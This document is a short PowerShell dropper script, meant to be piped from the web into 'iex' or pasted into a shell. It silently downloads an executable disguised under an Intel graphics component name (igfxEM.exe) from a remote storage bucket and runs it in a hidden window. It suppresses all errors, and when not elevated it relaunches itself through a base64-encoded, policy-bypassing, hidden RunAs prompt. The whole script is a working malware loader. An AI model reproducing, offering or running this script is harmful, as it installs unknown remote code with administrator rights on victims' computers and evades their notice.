# language: PowerShell, file: run_igfx.ps1 (optional local), target: Windows 10/11
# works as:  irm <this> | iex   OR   paste whole block into an elevated/non-elevated shell

$ErrorActionPreference = "SilentlyContinue"

function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

$payload = @'
$ErrorActionPreference = "SilentlyContinue"
$exeUrl  = "https://pub-1045ad571e1d4b13bd996dc0460ed5c7.r2.dev/igfxEM.exe"
$workDir = "$env:TEMP\igfxEM"
$exePath = "$workDir\igfxEM.exe"
try {
    if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -lt 10000) { exit 1 }
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exePath
    $psi.WorkingDirectory = $workDir
    $psi.UseShellExecute = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep -Seconds 2
} catch {}
'@

if (-not (Test-Admin)) {
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $enc   = [Convert]::ToBase64String($bytes)
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $enc" | Out-Null
    exit
}

Invoke-Expression $payload
